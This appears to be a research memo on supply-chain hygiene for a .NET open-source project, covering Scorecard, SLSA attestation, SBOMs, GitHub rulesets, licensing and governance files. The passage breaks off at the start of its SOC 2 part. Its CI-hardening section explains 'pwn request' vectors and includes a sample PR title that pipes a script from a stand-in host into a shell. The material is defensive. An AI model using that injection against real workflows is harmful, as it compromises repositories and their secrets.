# Lakewright.NET â€” OSS Governance / Supply-Chain Hygiene and Honest SOC 2 Positioning

Research date: 2026-07-31. Every claim below is tagged **[VERIFIED]** (fetched live this session, URL given) or **[RECALLED]** (from prior knowledge, not re-confirmed this session â€” treat as a hypothesis to check).

---

# PART A â€” Credible open-source project hygiene

## A1. OpenSSF Scorecard

### The checks and their weights

**[VERIFIED]** Scorecard runs 20 checks. Source: <https://github.com/ossf/scorecard/blob/main/docs/checks.md> and the machine-readable <https://github.com/ossf/scorecard/blob/main/docs/checks/internal/checks.yaml> (both fetched 2026-07-31, both agree).

| Check | Risk level | Weight | What it wants |
|---|---|---|---|
| Dangerous-Workflow | Critical | 10 | No untrusted-code-execution / script-injection patterns in workflows |
| Webhooks | Critical | 10 | Webhooks configured with a secret token |
| Binary-Artifacts | High | 7.5 | No checked-in executables/binaries |
| Branch-Protection | High | 7.5 | Branch protection or rulesets on the default branch |
| Code-Review | High | 7.5 | Changes were reviewed before merge |
| Dependency-Update-Tool | High | 7.5 | Dependabot / Renovate configured |
| Maintained | High | 7.5 | â‰¥90 days old and actively committed to |
| Signed-Releases | High | 7.5 | Release artifacts have signatures or provenance |
| Token-Permissions | High | 7.5 | `GITHUB_TOKEN` least-privilege |
| Vulnerabilities | High | 7.5 | No open OSV vulnerabilities |
| Fuzzing | Medium | 5 | OSS-Fuzz / ClusterFuzzLite / language-native fuzzing |
| Packaging | Medium | 5 | Publishes packages from CI/CD |
| Pinned-Dependencies | Medium | 5 | Actions pinned to SHA, lockfiles, Docker digests |
| SAST | Medium | 5 | CodeQL / SonarCloud / similar in CI |
| SBOM | Medium | 5 | An SBOM is produced and published |
| Security-Policy | Medium | 5 | `SECURITY.md` with disclosure instructions |
| CI-Tests | Low | 2.5 | Tests run on PRs |
| CII-Best-Practices | Low | 2.5 | Holds an OpenSSF Best Practices badge |
| Contributors | Low | 2.5 | Contributors from â‰¥2 (ideally 3) organizations |
| License | Low | 2.5 | A license file is present and detected |

**[VERIFIED]** Riskâ†’weight mapping is Critical 10 / High 7.5 / Medium 5 / Low 2.5, and the aggregate is "a weight-based average of the individual checks weighted by risk." Source: <https://github.com/ossf/scorecard> (README).

Note: **SBOM** is a relatively recent addition and does **not** appear in the README's older table but **does** appear in `docs/checks.md` and `checks.yaml`. Trust the latter two.

### Detailed scoring for the checks that matter to a solo maintainer

**[VERIFIED]** from `docs/checks.md`:

- **Branch-Protection** is tiered and each tier must be *fully* satisfied before the next counts:
  - Tier 1 â†’ 3/10: prevent force push and branch deletion
  - Tier 2 â†’ 6/10: require â‰¥1 reviewer, require PRs before changes, require branch up to date, require approval of the most recent push
  - Tier 3 â†’ 8/10: require â‰¥1 status check
  - Tier 4 â†’ 9/10: require â‰¥2 reviewers, require code-owner review
  - Tier 5 â†’ 10/10: dismiss stale reviews, include admins
  - **Solo-maintainer ceiling: 8/10.** Tier 4 needs 2 reviewers, which a solo project cannot honestly satisfy.
- **Code-Review** is penalty-based over roughly the last 30 commits: unreviewed bot changes âˆ’3; a single unreviewed human change âˆ’7; multiple unreviewed human changes an additional âˆ’3. "Implicit review" counts (merger â‰  committer), which a solo maintainer also cannot produce. **Solo-maintainer ceiling here is low unless you self-PR and let a bot or a second identity merge â€” do not game this.**
- **Contributors** requires "contributors from at least 3 different companies in the last 30 commits; each must have had at least 5 commits in the last 30 commits", determined from the GitHub profile *Company* field. **Impractical for a new solo project â€” score 0, cost 2.5 weight.**
- **Maintained**: archived â†’ lowest; â‰¥1 commit/week over 90 days â†’ highest; projects <90 days old are "too new to assess."
- **Signed-Releases**: checks the last 5 releases. Signature files (`*.asc`, `*.sig`, `*.sigstore.json`, `*.minisig`) â†’ 8 points. A **SLSA provenance file (`*.intoto.jsonl`) in all releases â†’ 10 points**. Signatures are not cryptographically verified by Scorecard â€” file presence is what is scored.
- **Pinned-Dependencies**: essentially binary; wants Actions pinned to full commit SHA, lockfiles present, Docker images pinned by digest.
- **Token-Permissions**: top-level `permissions: contents: read` plus job-level write escalation â†’ highest score. Defining permissions only at job level (top level undefined) costs a point.

### Running it

**[VERIFIED]** <https://github.com/ossf/scorecard-action>. Recommended workflow shape:

```yaml
name: Scorecard analysis
on:
  push:
    branches: [main]
  schedule:
    - cron: '0 0 * * 0'

permissions: read-all

jobs:
  analysis:
    runs-on: ubuntu-latest
    permissions:
      security-events: write   # upload SARIF to code scanning
      id-token: write          # REQUIRED when publish_results: true
      contents: read
    steps:
      - uses: actions/checkout@<sha>
      - uses: ossf/scorecard-action@<sha>
        with:
          results_file: results.sarif
          results_format: sarif
          publish_results: true
      - uses: github/codeql-action/upload-sarif@<sha>
        with:
          sarif_file: results.sarif
```

**[VERIFIED]** Constraints when `publish_results: true`: no top-level env vars or defaults, no workflow-level write permissions, only the scorecard job may hold `id-token: write`, must run on Ubuntu hosted runners, limited to an approved set of Actions. **[VERIFIED]** Classic branch-protection detection may need a fine-grained PAT; newer **Repository Rules (rulesets) work with the default token** â€” another reason to prefer rulesets.

### Realistic target for Lakewright.NET

**[RECALLED / analysis, not sourced]** â€” there is no official "target score" from OpenSSF; the FAQ deliberately does not set one (checked <https://github.com/ossf/scorecard/blob/main/docs/faq.md>, no guidance found).

Arithmetic from the verified weights: total weight = 10+10 + 7.5Ã—8 + 5Ã—6 + 2.5Ã—4 = 130.
- Guaranteed near-zero for a solo project: **Contributors** (2.5), **Fuzzing** (5, no practical .NET OSS-Fuzz path), **Code-Review** (7.5, heavily penalised).
- Capped: **Branch-Protection** at 8/10.
- That puts a realistic honest ceiling around **7.5â€“8.5 / 10**. Publish the badge once you are above 7; do not chase 10.

**Cheap wins (hours, not days), in order of weight-per-effort:**
1. `Token-Permissions` (7.5) â€” one `permissions: contents: read` line at the top of every workflow.
2. `Dangerous-Workflow` (10) â€” avoid `pull_request_target` + PR-head checkout entirely (see A6).
3. `Pinned-Dependencies` (5) â€” pin all Actions to full commit SHA; Dependabot can keep them fresh.
4. `Security-Policy` (5) â€” a `SECURITY.md`.
5. `License` (2.5) â€” `LICENSE` file.
6. `Dependency-Update-Tool` (7.5) â€” `.github/dependabot.yml` for `nuget` + `github-actions`.
7. `CI-Tests` (2.5) â€” you will have these anyway.
8. `Signed-Releases` (7.5) â€” `actions/attest` emits provenance; attach the attestation bundle to the release.
9. `SBOM` (5) â€” CycloneDX .NET tool, attached to the release (see A4).
10. `SAST` (5) â€” CodeQL default setup, free on public repos.
11. `Branch-Protection` (7.5, capped 8/10) â€” a ruleset with force-push/deletion blocked, PR required, 1 review, 1 status check.
12. `Webhooks` (10) â€” trivially satisfied by having no webhooks, or by setting secrets on any you add.

**Impractical / don't bother:** `Contributors`, `Fuzzing`, and the top two tiers of `Branch-Protection`. `Code-Review` will improve on its own the moment you have a second contributor.

## A2. OpenSSF Best Practices Badge (formerly CII)

**[VERIFIED]** Site: <https://www.bestpractices.dev/>. Passing criteria: <https://www.bestpractices.dev/en/criteria/0>. All levels: <https://www.bestpractices.dev/en/criteria>.

**[VERIFIED]** Two criteria families now coexist on the site:
- the **"metal" series** â€” passing / silver / gold (the classic CII criteria), and
- the **OpenSSF Baseline series** â€” baseline-1, 2, 3, a more minimal MUST-only checklist derived in part from global cybersecurity regulations.

**[VERIFIED]** Award rule: **all MUST and MUST NOT criteria must be met; all SHOULD criteria must be met OR the rationale for not meeting them documented; all SUGGESTED criteria must be explicitly rated met or unmet.** Self-assessed â€” you fill in the questionnaire yourself; the badge is issued automatically.

**[VERIFIED]** The six passing categories and their MUST content:
- **Basics** â€” project website stating what the software does; how to obtain, give feedback, and contribute; FLOSS license posted in the repo; basic and reference documentation; HTTPS on all project sites; a searchable discussion mechanism; project is actively maintained.
- **Change Control** â€” publicly readable version-controlled repository with change history; interim versions available for review between releases; unique version identifiers; human-readable release notes (not raw VCS logs).
- **Reporting** â€” documented bug-report process; majority of reports acknowledged within 2â€“12 months; publicly searchable report archive; published vulnerability-reporting process; response to vulnerability reports within 14 days; support for *private* vulnerability disclosure.
- **Quality** â€” working build system; publicly released FLOSS test suite with documented how-to-run; a policy that new major functionality comes with tests; compiler warnings / linters enabled and their findings addressed.
- **Security** â€” at least one primary developer who knows how to design secure software and knows the common classes of error; only publicly published, reviewed crypto protocols/algorithms; no publicly known unpatched medium/high vulnerabilities older than 60 days; credentials not leaked; passwords stored with iterated salted hashes; CSPRNG for key generation.
- **Analysis** â€” static analysis applied before major releases; medium/high severity findings fixed promptly.

**[VERIFIED]** Most crypto criteria carry an explicit **"N/A allowed"** escape hatch when the software does not use cryptography or crypto is not its primary purpose. Lakewright.NET will legitimately be N/A on the password-storage criteria if it delegates auth to Entra ID / Databricks OAuth.

**Practical read for Lakewright.NET:** the passing badge is achievable in roughly a day of documentation work, and it is worth doing because it also feeds the Scorecard `CII-Best-Practices` check. The two criteria with real teeth are *private vulnerability disclosure supported* (solved by GitHub private vulnerability reporting, A5) and *response within 14 days* (a commitment, put it in SECURITY.md and honour it).

**[VERIFIED]** OpenSSF Security Baseline (OSPS Baseline) is a separate, live artifact: <https://baseline.openssf.org/>, current version **v2026.02.19**. Three maturity levels â€” Level 1 (any project, any number of maintainers), Level 2 (â‰¥2 maintainers, consistent users), Level 3 (large consistent user base) â€” across categories Access Control (AC), Build and Release (BR), Documentation (DO), Governance (GV), Legal (LE), Quality (QA), Security Assessment (SA), Vulnerability Management (VM). Level 1 wants MFA on sensitive repo access, restricted new-collaborator permissions, protected primary branch, sanitised CI/CD inputs, no credentials in VCS, published user guide and defect-reporting process, open-source licence, documented contribution process, public source with change history, no binary artifacts, and a published security contact. **Lakewright.NET should target OSPS Baseline Level 1 explicitly â€” every Level 1 item is also a Scorecard cheap win.**

## A3. SLSA

**[VERIFIED]** Current specification version is **SLSA v1.2, status "Approved"** â€” <https://slsa.dev/spec/>. (v1.1 is retired; `https://slsa.dev/spec/v1.2/levels` 404s, the canonical entry point is `/spec/`.)

**[VERIFIED]** Build track levels (from <https://slsa.dev/spec/v1.1/levels>, still the readable levels page):
- **Build L0 â€” No guarantees.** Dev/test builds on a single machine.
- **Build L1 â€” Provenance exists.** Consistent build process; the build platform automatically generates provenance describing what entity built the package, what process was used, and the top-level inputs. Prevents mistakes; no tamper protection.
- **Build L2 â€” Hosted build platform.** L1 plus the hosted platform *generates and signs the provenance itself*. Prevents post-build tampering.
- **Build L3 â€” Hardened builds.** L2 plus the platform prevents runs from influencing one another and keeps the provenance signing key inaccessible to user-defined build steps.

### GitHub-native artifact attestation

**[VERIFIED]** Yes, and note the change: **`actions/attest-build-provenance` is superseded by `actions/attest` as of v4.** From <https://github.com/actions/attest-build-provenance>: "Existing applications may continue to use the `attest-build-provenance` action, but new implementations should use `actions/attest` instead." v4 of the old action is a thin wrapper over `actions/attest`.

**[VERIFIED]** <https://github.com/actions/attest> â€” generates signed in-toto attestations bound to artifacts using short-lived Sigstore-issued certificates, uploaded to GitHub's attestations API. Three modes:
1. **Provenance (default)** â€” auto-generates SLSA build provenance when no other input is given (references SLSA v1.0 provenance predicate).
2. **SBOM** â€” attests an SPDX or CycloneDX SBOM via `sbom-path`.
3. **Custom** â€” `predicate-type` / `predicate` / `predicate-path`.

```yaml
jobs:
  build:
    permissions:
      id-token: write        # mint the OIDC token for Sigstore
      contents: read
      attestations: write    # persist the attestation
    steps:
      - uses: actions/checkout@<sha>
      - run: dotnet pack -c Release -o ./artifacts
      - uses: actions/attest@v4      # pin to SHA in practice
        with:
          subject-path: '${{ github.workspace }}/artifacts/*.nupkg'
```

**[VERIFIED]** Permissions required: `id-token: write`, `attestations: write`, `contents: read`; `packages: write` additionally for container images; `artifact-metadata: write` when using `push-to-registry: true` or the linked-artifacts page (<https://docs.github.com/en/actions/how-tos/secure-your-work/use-artifact-attestations/use-artifact-attestations>).

**Realistic level for Lakewright.NET:** **[RECALLED]** GitHub-hosted runners with `actions/attest` are generally regarded as reaching **SLSA Build L2** out of the box (hosted platform generates and signs provenance; the signing key is Sigstore-issued and never exposed to the job). Neither `actions/attest` nor the GitHub docs page I fetched *states* a level â€” **do not put an "SLSA Level N" badge on the repo.** Say instead: "releases carry GitHub-generated, Sigstore-signed SLSA build provenance, verifiable with `gh attestation verify`." That is verifiable and does not overclaim.

Verification command for the README: `gh attestation verify <artifact> --repo <owner>/<repo>`. **[RECALLED]** â€” not re-confirmed this session.

## A4. SBOM for .NET

Two credible options, both live:

**[VERIFIED] CycloneDX for .NET** â€” <https://github.com/CycloneDX/cyclonedx-dotnet>. Apache-2.0. Install `dotnet tool install --global CycloneDX`; run `dotnet-CycloneDX <path> -o <output-dir>`. Accepts `.sln`, `.slnf`, `.slnx`, `.csproj`/`.fsproj`/`.vbproj`, `packages.config`, or a directory (recursive). Output formats via `-F`: Auto / XML / JSON / UnsafeJson. Runs on .NET 8, 9, 10. Distributed on NuGet and Docker Hub. There is also a companion GitHub Action, <https://github.com/CycloneDX/gh-dotnet-generate-sbom>.

**[VERIFIED] Microsoft `sbom-tool`** â€” <https://github.com/microsoft/sbom-tool>. Produces **SPDX 2.2 (default) and SPDX 3.0** (`-mi SPDX:3.0`). Installable as a .NET global tool: `dotnet tool install --global Microsoft.Sbom.DotNetTool`; also WinGet, Homebrew, direct download, Docker, and a NuGet API package. Docs reference GitHub Actions and Azure DevOps integration guides. No MSBuild integration mentioned.

**There is no first-party `dotnet sbom` command in the .NET SDK. [RECALLED]** â€” not found in any source fetched this session; do not assume one exists.

### Which format

Recommendation: **produce CycloneDX JSON as the primary artifact** and, if a consumer asks for SPDX, add `microsoft/sbom-tool` as a second job. Rationale:
- CycloneDX .NET is the more natural fit for the NuGet dependency graph and is a single global tool over the solution file.
- **[VERIFIED]** `actions/attest` accepts **either** SPDX or CycloneDX for SBOM attestation, so format choice does not lock you out of provenance.
- **[VERIFIED]** GitHub's own dependency-graph SBOM export is **SPDX**, via `GET /repos/{owner}/{repo}/dependency-graph/sbom/generate-report` then `GET .../fetch-report/{sbom-uuid}` â€” <https://docs.github.com/en/rest/dependency-graph/sboms>. Usable unauthenticated for public repos. **[VERIFIED]** As of 2026-04-14 SBOM exports are computed asynchronously (<https://github.blog/changelog/2026-04-14-sbom-exports-are-now-computed-asynchronously/>). **Important limitation [VERIFIED]:** GitHub SBOM export is only available for `HEAD` â€” it reflects the current default branch, *not* a release tag. So GitHub's export is not a substitute for generating an SBOM in the release job.

### How to publish it with a release

```yaml
# in the release job
- run: dotnet tool install --global CycloneDX
- run: dotnet-CycloneDX ./Lakewright.sln -o ./sbom -F Json
- uses: actions/attest@v4          # pin to SHA
  with:
    subject-path: './artifacts/*.nupkg'
    sbom-path: './sbom/bom.json'
- uses: softprops/action-gh-release@<sha>   # or gh release upload
  with:
    files: |
      ./artifacts/*.nupkg
      ./sbom/bom.json
```

Attach the SBOM file to the GitHub Release **and** attest it. Attaching alone satisfies Scorecard's `SBOM` check; the attestation is what makes it trustworthy.

## A5. GitHub security features free on public repos (personal account)

**[VERIFIED]** From <https://docs.github.com/en/code-security/getting-started/github-security-features> â€” free and on by default or one click away for **public** repositories:

| Feature | Free on public repos? | Source note |
|---|---|---|
| Dependency graph | Yes, all plans | |
| Dependabot alerts | Yes | Also listed under GitHub Free in the plans page |
| Dependabot version/security updates | Yes | |
| Dependency review (on PRs) | Yes, by default | |
| Secret scanning alerts | Yes, by default | |
| Push protection (blocks the push) | Yes, by default | |
| Code scanning / CodeQL | Yes | <https://docs.github.com/en/code-security/code-scanning/enabling-code-scanning/configuring-default-setup-for-code-scanning>: eligible if "GitHub Actions is enabled" and the repo "is publicly visible, or GitHub Code Security is enabled." **C# is a supported CodeQL language.** |
| Repository security advisories | Yes | |
| Private vulnerability reporting | Yes, public repos only | <https://docs.github.com/en/code-security/security-advisories/guidance-on-reporting-and-writing-information-about-vulnerabilities/privately-reporting-a-security-vulnerability>: "Owners and administrators of public repositories can enable private vulnerability reporting." |
| **Rulesets** (branch/tag protection) | **Yes** | <https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/about-rulesets>: "Rulesets are available in public repositories with GitHub Free and GitHub Free for organizations, and in public and private repositories with GitHub Pro, GitHub Team, and GitHub Enterprise Cloud." Up to 75 rulesets per repo. **Push rulesets are Team-plan-only** (internal/private repos). |
| GitHub Actions | 2,000 min/month on Free; **[RECALLED]** unlimited for public repos on standard runners | <https://docs.github.com/en/get-started/learning-about-github/githubs-plans> lists "2,000 minutes per month" under Free â€” this figure applies to private-repo usage; public-repo minutes on standard hosted runners are not billed. Verify before relying on it. |

**Requires a paid GitHub Code Security / Secret Protection license (i.e. NOT free even on public repos):** custom secret-scanning patterns, AI-detected secrets ("Copilot secret scanning"), delegated bypass for push protection, Copilot Autofix, custom Dependabot auto-triage rules, security campaigns, and the org-level security overview.

**Caution on classic branch protection.** **[VERIFIED]** <https://docs.github.com/en/repositories/.../about-protected-branches> phrases push restrictions as available in "public repositories owned by a GitHub Free **organization** and in all repositories owned by an organization using GitHub Team or GitHub Enterprise Cloud", and the plans page lists "Protected branches" as a **GitHub Pro** feature for personal accounts. **Conclusion: on a personal-account public repo, use rulesets, not classic branch protection.** Rulesets are explicitly documented as available on GitHub Free for public repos, and Scorecard's Branch-Protection check reads rulesets with the default token (no PAT needed).

The eleven classic protection settings, which rulesets mirror: require PR reviews, require status checks, require conversation resolution, require signed commits, require linear history, require merge queue, require deployments to succeed, lock branch, do not allow bypassing, restrict who can push, allow force pushes / deletions.

### Recommended baseline ruleset for Lakewright.NET
- Target: default branch (`main`)
- Block force pushes; block deletions
- Require a pull request before merging; 1 approving review; require approval of the most recent push; require conversation resolution
- Require status checks: build, test, CodeQL, actionlint/zizmor
- Require linear history
- Do **not** enable "require signed commits" initially â€” it breaks web-UI and mobile contributions and adds friction for a first-time contributor. **[RECALLED]** judgement call, not a sourced claim.

## A6. CI from untrusted forks â€” the actual attack and the safe pattern

### The attack ("pwn request")

**[VERIFIED]** <https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/>: "Combining `pull_request_target` workflow trigger with an explicit checkout of an untrusted PR is a dangerous practice that may lead to repository compromise."

The mechanism: `pull_request_target` runs the workflow **in the context of the base repository** â€” it gets a read/write `GITHUB_TOKEN` and access to repository secrets, unlike `pull_request` from a fork which gets a read-only token and no secrets. If such a workflow then checks out `github.event.pull_request.head.sha` and executes anything from it, the attacker's code runs privileged. **[VERIFIED]** Injection vectors listed: modifying build files (`make`, PowerShell), editing `package.json` to point at a malicious package, adding a test file containing a payload, and `npm preinstall`/`postinstall` scripts. For .NET the equivalents are MSBuild `Directory.Build.props`/`.targets`, custom MSBuild tasks, `global.json`, a `NuGet.config` pointing at an attacker feed, and `dotnet test` running attacker-authored test code.

The second, distinct attack is **script injection**: interpolating `${{ github.event.pull_request.title }}` or `...body` or `...head.ref` directly into a `run:` block. The expression is substituted *before* the shell runs, so a PR title of `"; curl evil.sh | sh; #` becomes shell code.

### The safe patterns

**[VERIFIED]** from <https://docs.github.com/en/actions/how-tos/security-for-github-actions/security-guides/security-hardening-for-github-actions>:

1. **Never combine `pull_request_target` with a checkout of the PR head.** Avoid `pull_request_target` and `workflow_run` unless genuinely necessary; when using them, never check out untrusted fork code.
2. **Use `pull_request`, not `pull_request_target`, for build/test of fork PRs.** Fork PRs get a read-only token and no secrets â€” that is the security property you want, not a problem to work around.
3. **Never interpolate untrusted context into `run:`.** Either use an action (context values arrive as arguments, not as generated shell code) or bind to an intermediate environment variable and quote it:
   ```yaml
   - env:
       PR_TITLE: ${{ github.event.pull_request.title }}
     run: echo "$PR_TITLE"
   ```
4. **Two-workflow pattern** for anything that needs privileges (posting a comment, updating a check, uploading coverage). Workflow 1: `on: pull_request`, `permissions: contents: read`, builds/tests the untrusted code and uploads results as an artifact. Workflow 2: `on: workflow_run`, holds the privileges/secrets, downloads the artifact into a safe directory and acts on it â€” **it never executes untrusted code.** Treat artifacts from `workflow_run` as untrusted data.
5. **Pin every action to a full-length commit SHA.** "Pinning to a full-length commit SHA is currently the only way to use an action as an immutable release."
6. **Least-privilege `GITHUB_TOKEN`:** default the whole workflow to `permissions: contents: read` and escalate per job.
7. **No self-hosted runners on public repos** â€” "almost never be used for public repositories", since any PR author can execute arbitrary code on them.

**Tooling to enforce this mechanically [VERIFIED]:** `zizmor` (<https://github.com/zizmorcore/zizmor>, <https://zizmor.sh>) â€” a security linter for GitHub Actions that finds template-injection leading to attacker-controlled execution, credential persistence/leakage, and excessive permission scopes; and `actionlint` for correctness plus basic injection patterns. **[VERIFIED]** They are complementary and are commonly run together (GitHub's own `github/gh-aw` runs zizmor + poutine + actionlint daily). Add both as a required status check â€” this is a very cheap way to keep the Scorecard `Dangerous-Workflow` (weight 10) check green permanently.

## A7. Licensing â€” Apache-2.0 vs MIT, DCO vs CLA, and the Databricks trap

### Recommendation: **Apache-2.0**

**[VERIFIED]** Apache-2.0 <https://www.apache.org/licenses/LICENSE-2.0>:
- **Section 3** grants a "perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable" **patent licence**, with a defensive termination clause: the grant terminates if you initiate patent litigation alleging the work infringes.
- **Section 4** redistribution conditions: give recipients a copy of the licence; mark modified files as changed; retain copyright/patent/trademark/attribution notices; **and if the original work has a `NOTICE` file, reproduce its attribution notices** in the derivative's NOTICE, in the documentation, or in a display.

MIT has **no express patent grant**. For a SaaS *accelerator* that enterprises will fork and build revenue products on, the explicit patent grant and the defensive-termination clause are exactly what a corporate legal review looks for. That is the deciding factor.

Counter-consideration **[VERIFIED]**: the .NET ecosystem's centre of gravity is MIT â€” `dotnet/runtime` is MIT ("Copyright (c) .NET Foundation and Contributors"), <https://github.com/dotnet/runtime/blob/main/LICENSE.TXT>. But the Databricks *and* observability sides are Apache-2.0: `databricks/databricks-sdk-go` is Apache-2.0 (<https://github.com/databricks/databricks-sdk-go/blob/main/LICENSE>), and `open-telemetry/opentelemetry-dotnet` is "licensed under the Apache License, Version 2.0". Apache-2.0 is fully compatible with consuming MIT dependencies. **Go Apache-2.0, add a `NOTICE` file.**

### DCO, not CLA

**[VERIFIED]** DCO 1.1 full text: <https://developercertificate.org/>. Four certifications: (a) I created it and have the right to submit it under the stated licence; (b) it is based on prior work under an appropriate open source licence and I have the right to submit the modification; (c) it was provided to me by someone who made (a)/(b)/(c) and I have not modified it; (d) I understand the project and contribution are public and the record â€” including my sign-off and personal information â€” is retained indefinitely and may be redistributed.

Mechanics: `git commit -s` appends `Signed-off-by: Name <email>`; enforce with the DCO GitHub App as a required status check.

Why DCO over CLA for this project:
- A CLA requires a legal entity to receive the grant. A personal-account project has no such entity, so a CLA would assign rights to *you personally* â€” which is a red flag for corporate contributors and materially depresses contribution.
- **[VERIFIED]** the real-world split confirms this. CLA is used where a foundation backs it: `App-vNext/Polly` requires the **.NET Foundation CLA** at `cla.dotnetfoundation.org` (<https://github.com/App-vNext/Polly/blob/main/CONTRIBUTING.md>); `open-telemetry/opentelemetry-dotnet` requires a **CLA** (CNCF). DCO is used where the barrier should be low: **`delta-io/delta` requires DCO sign-off** â€” "you just add a line to every git commit message: `Signed-off-by: Jane Smith <jane.smith@email.com>`" (<https://github.com/delta-io/delta/blob/master/CONTRIBUTING.md>).
- If Lakewright.NET is ever donated to a foundation, the DCO history is clean enough to relicense-forward; a bespoke personal CLA is the harder thing to unwind.

### âš ï¸ The Databricks licensing trap â€” this is the most important finding in Part A

**Do not copy code from Databricks Labs or most Databricks Industry Solutions repos.** They are **not** open source.

**[VERIFIED]** all fetched 2026-07-31:
- `databrickslabs/ucx/LICENSE` â†’ **"Databricks License", Copyright (2023) Databricks, Inc.** â€” proprietary; restricts use of the licensed materials to use in connection with Databricks Services under the Master Cloud Services Agreement.
- `databrickslabs/dqx/LICENSE` â†’ **Databricks License**, Copyright (2024) Databricks, Inc.
- `databricks-industry-solutions/media-mix-modeling/LICENSE` â†’ **Databricks proprietary licence**: "This library (the 'Software') may not be used except in connection with the Licensee's use of the Databricks Platform Services pursuant to an Agreementâ€¦"
- `databricks/app-templates/LICENSE` â†’ **Databricks License.**
- Canonical text: <https://www.databricks.com/legal/db-license> â€” you may "view, use, copy, modify, publish, and/or distribute the Licensed Materials **solely for the purposes of using the Licensed Materials within or connecting to the Databricks Services**." It is **not** an OSI open-source licence.

By contrast, `databricks/databricks-sdk-go` **is** Apache-2.0 â€” the first-party SDKs are genuinely open source, the Labs and Solutions repos generally are not. **[VERIFIED]** Some industry-solutions repos *are* Apache-2.0 (the search surfaced `oncology` and `ocr-phi-masking` as Apache-2.0) â€” **so check the LICENSE file of each individual repo, every time. Never assume.**

**[VERIFIED]** Databricks documentation itself: <https://www.databricks.com/legal/terms-of-use> â€” you may not "copy, collect, modify, create derivative works or uses of, translate, distribute, transmit, publish, re-publishâ€¦ the Content or any other part of the Services, except solely as necessary to access the Sites for the intended purpose."

**Practical rules for Lakewright.NET:**
1. **Never paste code from a Databricks-Licensed repo or from docs.databricks.com into an Apache-2.0 repo.** Publishing Lakewright.NET under Apache-2.0 with Databricks-Licensed code inside is a licence violation and makes the whole repo unsafe for the enterprises you want adopting it.
2. Use Databricks docs and Labs repos **as reference only** â€” read, understand, then write original code against the public REST API surface.
3. **Only take code from Databricks repos that are demonstrably Apache-2.0** (the first-party SDKs). Record each such borrowing in `THIRD-PARTY-NOTICES.md` with repo URL, commit SHA, licence, and copyright line; carry over any upstream NOTICE content per Apache-2.0 Â§4.
4. **OpenAPI-generated clients:** **[RECALLED â€” verify before relying on it]** code generated by OpenAPI Generator / NSwag / Kiota from a spec is generally treated as your own work, and OpenAPI Generator explicitly disclaims any licence on generated output. The risk is not the generator, it is **the spec**: if you fetch Databricks' OpenAPI spec from a Databricks-Licensed source, the derived client may be a derivative work of that spec. **Action: (a) confirm the licence on whatever Databricks OpenAPI/spec artefact you use; (b) if in doubt, generate from your own hand-written spec derived from the public REST documentation's endpoint list rather than from a downloaded spec file; (c) record the provenance in an ADR.** Treat this as an open legal question to resolve, not a settled one.
5. Add a short "Relationship to Databricks" section to the README: Lakewright.NET is an independent, unaffiliated project; Databricks is a trademark of Databricks, Inc.; no endorsement implied. Apache-2.0 Â§6 does not grant trademark rights.

## A8. Governance documents worth modelling

**[VERIFIED]** `cncf/project-template` â€” <https://github.com/cncf/project-template>, docs at <https://contribute.cncf.io/maintainers/templates/>. Templates: `GOVERNANCE-maintainer.md` (self-selecting Maintainer Council â€” "the most common form of governance for CNCF projects"), `GOVERNANCE-elections.md` (Steering Committee elections), `GOVERNANCE-subprojects.md` (umbrella project of projects). Adoption: rename the chosen `GOVERNANCE-xxx.md` to `GOVERNANCE.md` and fill in the `TODO` comments. **This is the right starting point for Lakewright.NET â€” take the Maintainer Council template and strip it down to one maintainer with a documented path to adding more.** Files: <https://github.com/cncf/project-template/blob/main/GOVERNANCE-maintainer.md>, <https://github.com/cncf/project-template/blob/main/GOVERNANCE.md>.

**[VERIFIED]** `open-telemetry/opentelemetry-dotnet` â€” <https://github.com/open-telemetry/opentelemetry-dotnet/blob/main/CONTRIBUTING.md>. Best-in-class for a .NET project with a real role ladder. What is good: it defines **Member / Triager / Approver / Maintainer** by reference to a shared community-membership doc (<https://github.com/open-telemetry/community/blob/main/community-membership.md>) rather than reinventing it; it distinguishes *approve* from *merge* authority; it mandates a **minimum one-day review window** before merge (a genuinely good rule for a project with few reviewers â€” it prevents rubber-stamping); it runs a **buddy system** for new contributors; it requires third-party files to be permissively licensed with attribution in a third-party notices file. Apache-2.0.

**[VERIFIED]** `delta-io/delta` â€” <https://github.com/delta-io/delta/blob/master/CONTRIBUTING.md>. Best model for the *data-tooling* half. What is good: an explicit **size threshold that triggers design discussion** â€” changes altering >100 lines require prior discussion via issue/Slack/email, small bug fixes do not; design documents expected for significant changes; **DCO sign-off** rather than a CLA; governance anchored in a published founding technical charter under the Linux Foundation. The >100-line rule is worth copying verbatim: it tells a drive-by contributor exactly when to ask first, which is the single most common source of wasted contributor effort.

**[VERIFIED]** `dbt-labs/dbt-core` â€” <https://github.com/dbt-labs/dbt-core/blob/main/CONTRIBUTING.md>. Best model for *contributor experience*. What is good: a **status table explaining what each review label means**, so a contributor can self-serve "what is happening to my PR"; explicit management of expectations about internal sync processes; a changelog tool (`changie`) with an explicit maintainer override when a changelog entry is unnecessary; friction removal stated up front ("There are no virtual environments needed!").

**[VERIFIED]** `dotnet/aspnetcore/SECURITY.md` â€” <https://github.com/dotnet/aspnetcore/blob/main/SECURITY.md>. Minimal and correct: a Supported Versions section pointing at the support policy, a private reporting channel (MSRC), a stated response SLA (24 hours), and an explicit "please do not open issues for anything you think might have a security implication." Copy that last sentence.

**[VERIFIED]** `dotnet/runtime/CONTRIBUTING.md` â€” <https://github.com/dotnet/runtime/blob/main/CONTRIBUTING.md>. Good for its **DO / DON'T prescriptive style with reasons attached** ("DO follow our coding style", "DO include tests when adding new features"), its emphasis on minimal reproductions and *why* they help, and its numbered issue-to-merge workflow.

### Recommended file set for Lakewright.NET

`LICENSE` (Apache-2.0) Â· `NOTICE` Â· `THIRD-PARTY-NOTICES.md` Â· `README.md` (with a "Relationship to Databricks" section) Â· `CONTRIBUTING.md` (DCO sign-off; a >100-line design-discussion threshold Ã  la Delta; a PR label/status table Ã  la dbt) Â· `CODE_OF_CONDUCT.md` (Contributor Covenant 2.1) Â· `GOVERNANCE.md` (CNCF Maintainer Council template, reduced to one maintainer plus a documented path to more) Â· `SECURITY.md` (private vulnerability reporting link, 14-day response commitment to satisfy the Best Practices badge, "do not open public issues for security") Â· `MAINTAINERS.md` Â· `SUPPORT.md` Â· `.github/dependabot.yml` Â· `.github/workflows/` with pinned actions and top-level `permissions: contents: read` Â· `docs/adr/` Â· `docs/compliance/soc2-mapping.md` (Part B).

---

# PART B â€” SOC 2, honestly

## B9. SOC 2 applies to a service organization, not to a repository

